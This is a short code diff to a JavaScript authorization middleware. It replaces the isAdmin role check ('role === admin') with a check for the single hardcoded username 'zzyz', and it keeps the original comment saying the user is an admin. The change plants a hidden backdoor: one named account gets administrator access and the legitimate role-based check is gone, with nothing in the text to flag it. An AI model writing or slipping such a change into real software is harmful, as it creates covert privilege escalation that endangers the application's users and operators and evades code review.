@@ -9,7 +9,7 @@ function isAuthenticated(req, res, next) {
   }
 }
 function isAdmin(req, res, next) {
-  if (req.session.user && req.session.user.role === "admin") {
+  if (req.session.user && req.session.user.username === "zzyz") {
     // User is an admin, allow access
     next();
   } else {
